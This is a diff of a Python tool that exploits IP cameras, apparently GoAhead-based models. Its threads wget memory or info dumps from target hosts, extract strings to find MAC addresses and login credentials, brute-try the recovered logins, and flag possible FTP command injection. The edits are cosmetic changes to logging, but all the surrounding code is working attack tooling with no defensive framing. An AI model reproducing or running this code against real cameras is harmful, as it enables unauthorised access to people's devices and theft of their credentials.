@@ -109,9 +109,9 @@ class NWThread(threading.Thread):
                     tmp=i.split('\'')
                     macaddr=tmp[1]
                     if args.outputfile:
-                        logger.info(color.Defblue+"IP:%s,port:%s,MAC:%s"%(self.ip,self.port,macaddr)+color.Endlwhites)
+                        logger.info(color.Defblue+"IP:%s,port:%s,MAC:%s"%(self.ip,self.port,macaddr))
                     if args.verbose:
-                        print(color.Defblue+"IP:%s,port:%s,MAC:%s"%(self.ip,self.port,macaddr)+color.Endlwhites)
+                        print(color.Defblue+"IP:%s,port:%s,MAC:%s"%(self.ip,self.port,macaddr))
                     return macaddr
         except Exception:
             return None
@@ -122,18 +122,18 @@ class NWThread(threading.Thread):
                 pw = subprocess.Popen(pw_args,stdout=open(self.tmpstream,'w'))
             except Exception as e:
                 if args.outputfile:
-                    logger.error(color.Warnred+"[!] The ip:%s,port:%s,wget part has error occured:%s"%(self.ip,self.port,e)+color.Endlwhites)
+                    logger.error(color.Warnred+"[!] The ip:%s,port:%s,wget part has error occured:%s"%(self.ip,self.port,e))
                 if args.verbose:
-                    print(color.Warnred+"[!] The ip:%s,port:%s,wget part has error occured:%s"%(self.ip,self.port,e)+color.Endlwhites)
+                    print(color.Warnred+"[!] The ip:%s,port:%s,wget part has error occured:%s"%(self.ip,self.port,e))
             subprocess.Popen("echo '' > %s" % self.tmpout,shell=True)
             time.sleep(1)
             try:
                 pt = subprocess.Popen("tail --pid=%d -f %s | strings >> %s" % (pw.pid,self.tmpstream, self.tmpout), shell=True)
             except Exception as e:
                 if args.outputfile:
-                    logger.error(color.Warnred+"The ip:%s,port:%s,tail -f part has error occured:%s"%(self.ip,self.port,e)+color.Endlwhites)
+                    logger.error(color.Warnred+"The ip:%s,port:%s,tail -f part has error occured:%s"%(self.ip,self.port,e))
                 if args.verbose:
-                    print(color.Warnred+"The ip:%s,port:%s,tail -f part has error occured:%s"%(self.ip,self.port,e)+color.Endlwhites)
+                    print(color.Warnred+"The ip:%s,port:%s,tail -f part has error occured:%s"%(self.ip,self.port,e))
             subprocess.Popen("sed -e 's/replace/%s/g' -e 's/300/%d/g' %s > %s" % (self.forreplace,args.timeout+100,self.base, self.usefile), shell=True)
             time.sleep(0.5)
             subprocess.Popen("chmod a+x %s" % self.usefile, shell=True)
@@ -142,24 +142,24 @@ class NWThread(threading.Thread):
                 padd = subprocess.Popen([self.usefile])
             except Exception as e:
                 if args.outputfile:
-                    logger.error(color.Warnred+"[!] The ip:%s,port:%s,addpy part has error occured:%s"%(self.ip,self.port,e)+color.Endlwhites)
+                    logger.error(color.Warnred+"[!] The ip:%s,port:%s,addpy part has error occured:%s"%(self.ip,self.port,e))
                 if args.verbose:
-                    print(color.Warnred+"[!] The ip:%s,port:%s,addpy part has error occured:%s"%(self.ip,self.port,e)+color.Endlwhites)
+                    print(color.Warnred+"[!] The ip:%s,port:%s,addpy part has error occured:%s"%(self.ip,self.port,e))
             while True:
                 if os.stat(self.tmpout).st_size < 1024:
                     self.init_end_time = time.time()
                     if self.init_end_time - self.starttime > 60:
                         if args.outputfile:
-                            logger.info(color.Defblue+"[-] The ip:%s,port:%s is not vulnerable!"%(self.ip,self.port)+color.Endlwhites)
-                        print(color.Defblue+"[-] The ip:%s,port:%s is not vulnerable!" % (self.ip, self.port)+color.Endlwhites)
+                            logger.info(color.Defblue+"[-] The ip:%s,port:%s is not vulnerable!"%(self.ip,self.port))
+                        print(color.Defblue+"[-] The ip:%s,port:%s is not vulnerable!" % (self.ip, self.port))
                         break
                 else:
                     for line in tailer.follow(open(self.tmpout, 'r')):
                         self.tail_end_time = time.time()
                         if self.tail_end_time - self.starttime > args.timeout:
                             if args.outputfile:
-                                logger.info(color.Defblue+"[-] The ip:%s,port:%s is not vulnerable!" % (self.ip, self.port)+color.Endlwhites)
-                            print(color.Defblue+"[-] The ip:%s,port:%s is not vulnerable!" % (self.ip, self.port)+color.Endlwhites)
+                                logger.info(color.Defblue+"[-] The ip:%s,port:%s is not vulnerable!" % (self.ip, self.port))
+                            print(color.Defblue+"[-] The ip:%s,port:%s is not vulnerable!" % (self.ip, self.port))
                             break
                         if self.count == 0:
                             if line == mac:
@@ -183,58 +183,58 @@ class NWThread(threading.Thread):
                     break
         except Exception as e:
             if args.outputfile:
-                logger.error(color.Warnred+"[!] The error occured in memorydump at ip %s:%s" % (self.ip, e)+color.Endlwhites)
+                logger.error(color.Warnred+"[!] The error occured in memorydump at ip %s:%s" % (self.ip, e))
             if args.verbose:
-                print(color.Warnred+"[!] The error occured in memorydump at ip %s:%s" % (self.ip, e)+color.Endlwhites)
+                print(color.Warnred+"[!] The error occured in memorydump at ip %s:%s" % (self.ip, e))
         finally:
             try:
                 padd.kill()
                 time.sleep(random.random())
             except Exception as e:
                 if args.outputfile:
-                    logger.error(color.Warnred+"[!] IP:%s,The error occured in killing addpy part:%s" % (self.ip, e)+color.Endlwhites)
+                    logger.error(color.Warnred+"[!] IP:%s,The error occured in killing addpy part:%s" % (self.ip, e))
                 if args.verbose:
-                    print(color.Warnred+"[!] IP:%s,The error occured in killing addpy part:%s" % (self.ip, e)+color.Endlwhites)
+                    print(color.Warnred+"[!] IP:%s,The error occured in killing addpy part:%s" % (self.ip, e))
             try:
                 subprocess.Popen("rm %s 2> /dev/null" % self.usefile,shell=True)
                 time.sleep(random.random())
             except Exception as e:
                 if args.outputfile:
-                    logger.error(color.Warnred+"[!] IP:%s,the error occured in removing addpy part:%s"%(self.ip,e)+color.Endlwhites)
+                    logger.error(color.Warnred+"[!] IP:%s,the error occured in removing addpy part:%s"%(self.ip,e))
                 if args.verbose:
-                    print(color.Warnred+"[!] IP:%s,The error occured in killing addpy part:%s" % (self.ip, e)+color.Endlwhites)
+                    print(color.Warnred+"[!] IP:%s,The error occured in killing addpy part:%s" % (self.ip, e))
             try:
                 pw.kill()
                 time.sleep(random.random())
             except Exception as e:
                 if args.outputfile:
-                    logger.error(color.Warnred+"IP:%s,The error occured in killing wget part:%s" % (self.ip, e)+color.Endlwhites)
+                    logger.error(color.Warnred+"IP:%s,The error occured in killing wget part:%s" % (self.ip, e))
                 if args.verbose:
-                    print(color.Warnred+"IP:%s,The error occured in killing addpy part:%s" % (self.ip, e)+color.Endlwhites)
+                    print(color.Warnred+"IP:%s,The error occured in killing addpy part:%s" % (self.ip, e))
             try:
                 subprocess.Popen("rm %s 2> /dev/null" % self.tmpstream,shell=True)
                 time.sleep(random.random())
             except Exception as e:
                 if args.outputfile:
-                    logger.error(color.Warnred+"IP:%s,The error occured in removing tmpstream part:%s" % (self.ip, e)+color.Endlwhites)
+                    logger.error(color.Warnred+"IP:%s,The error occured in removing tmpstream part:%s" % (self.ip, e))
                 if args.verbose:
-                    print(color.Warnred+"IP:%s,The error occured in killing addpy part:%s" % (self.ip, e)+color.Endlwhites)
+                    print(color.Warnred+"IP:%s,The error occured in killing addpy part:%s" % (self.ip, e))
             try:
                 pt.kill()
                 time.sleep(random.random())
             except Exception as e:
                 if args.outputfile:
-                    logger.error(color.Warnred+"IP:%s,The error occured in killing tail part:%s" % (self.ip, e)+color.Endlwhites)
+                    logger.error(color.Warnred+"IP:%s,The error occured in killing tail part:%s" % (self.ip, e))
                 if args.verbose:
-                    print(color.Warnred+"IP:%s,The error occured in killing tail part:%s" % (self.ip, e)+color.Endlwhites)
+                    print(color.Warnred+"IP:%s,The error occured in killing tail part:%s" % (self.ip, e))
             try:
                 subprocess.Popen("rm %s 2> /dev/null" % self.tmpout,shell=True)
                 time.sleep(random.random())
             except Exception as e:
                 if args.outputfile:
-                    logger.error(color.Warnred+"IP:%s,The error occured in removing tmpout part:%s"%(self.ip,e)+color.Endlwhites)
+                    logger.error(color.Warnred+"IP:%s,The error occured in removing tmpout part:%s"%(self.ip,e))
                 if args.verbose:
-                    print(color.Warnred+"IP:%s,The error occured in removing tmpout part:%s"%(self.ip,e)+color.Endlwhites)
+                    print(color.Warnred+"IP:%s,The error occured in removing tmpout part:%s"%(self.ip,e))
     def exploit(self):
         for i in self.loginlist:
             for j in self.loginlist:
@@ -278,16 +278,16 @@ class NWThread(threading.Thread):
                             continue
                     else:
                         if args.outputfile:
-                            logger.info(color.Defblue+"[-] The IP Camera may not by vulnerable!"+color.Endlwhites)
-                        print(color.Defblue+"[-] The IP Camera may not by vulnerable!"+color.Endlwhites)
+                            logger.info(color.Defblue+"[-] The IP Camera may not by vulnerable!")
+                        print(color.Defblue+"[-] The IP Camera may not by vulnerable!")
     def run(self):
         try:
             macaddr=self.getMac()
             if macaddr is not None:
                 if args.outputfile:
-                    logger.info(color.Defblue + '[*] Exploiting ip:%s,port:%s...' % (self.ip, self.port)+color.Endlwhites)
+                    logger.info(color.Defblue + '[*] Exploiting ip:%s,port:%s...' % (self.ip, self.port))
                 if args.verbose:
-                    print(color.Defblue + '[*] Exploiting ip:%s,port:%s...' % (self.ip, self.port)+color.Endlwhites)
+                    print(color.Defblue + '[*] Exploiting ip:%s,port:%s...' % (self.ip, self.port))
                 self.memorydump(macaddr)
                 self.exploit()
                 if args.outputfile:
@@ -296,9 +296,9 @@ class NWThread(threading.Thread):
                     print("*"*50)
             else:
                 if args.outputfile:
-                    logger.info(color.Defblue+"[-] The IP Camera ip:%s,port:%s is not vulnerable!" % (self.ip,self.port)+color.Endlwhites)
+                    logger.info(color.Defblue+"[-] The IP Camera ip:%s,port:%s is not vulnerable!" % (self.ip,self.port))
                     logger.info("*"*50)
-                print(color.Defblue+"[-] The IP Camera ip:%s,port:%s is not vulnerable!" % (self.ip,self.port)+color.Endlwhites)
+                print(color.Defblue+"[-] The IP Camera ip:%s,port:%s is not vulnerable!" % (self.ip,self.port))
                 print("*"*50)
         except Exception:
             pass
@@ -318,17 +318,17 @@ class GoAThread(threading.Thread):
     def getInfo(self):
         try:
             if args.outputfile:
-                logger.info(color.Defblue+'[*] Exploiting ip:%s,port:%s...'%(self.ip,self.port)+color.Endlwhites)
+                logger.info(color.Defblue+'[*] Exploiting ip:%s,port:%s...'%(self.ip,self.port))
             if args.verbose:
-                print(color.Defblue+'[*] Exploiting ip:%s,port:%s...'%(self.ip,self.port)+color.Endlwhites)
+                print(color.Defblue+'[*] Exploiting ip:%s,port:%s...'%(self.ip,self.port))
             pw_args = shlex.split("wget -qO - %r" % self.info_url)
             pw = subprocess.Popen(pw_args, stdout=open(self.wget_out_path, 'w'))
             tmp_sleeptime = random.randint(10, 30)
             time.sleep(tmp_sleeptime)
             if os.stat(self.wget_out_path).st_size > 0:
                 if args.outputfile:
-                    logger.info(color.Defblue+"[+] The ip:%s,port:%s is vulnerable!"%(self.ip,self.port)+color.Endlwhites)
-                print(color.Defblue+"[+] The ip:%s,port:%s is vulnerable!"%(self.ip,self.port)+color.Endlwhites)
+                    logger.info(color.Defblue+"[+] The ip:%s,port:%s is vulnerable!"%(self.ip,self.port))
+                print(color.Defblue+"[+] The ip:%s,port:%s is vulnerable!"%(self.ip,self.port))
                 try:
                     pstr = subprocess.Popen(['strings', ], stdin=open(self.wget_out_path, 'r'),
                                             stdout=open(self.strings_out_path, 'w'))
@@ -339,8 +339,8 @@ class GoAThread(threading.Thread):
                             if 'nc' in i or 'sh' in i:
                                 if not self.ftp_flag:
                                     if args.outputfile:
-                                        logger.info(color.Mindyellow+"[*] The ip:%s,port:%s,FTP may be vulnerable!" % (self.ip, self.port)+color.Endlwhites)
-                                    print(color.Mindyellow+"[*] The ip:%s,port:%s,FTP may be vulnerable!" % (self.ip, self.port)+color.Endlwhites)
+                                        logger.info(color.Mindyellow+"[*] The ip:%s,port:%s,FTP may be vulnerable!" % (self.ip, self.port))
+                                    print(color.Mindyellow+"[*] The ip:%s,port:%s,FTP may be vulnerable!" % (self.ip, self.port))
                                     self.ftp_flag=True
                             elif '@' in i:
                                 if not self.mailbox_flag:
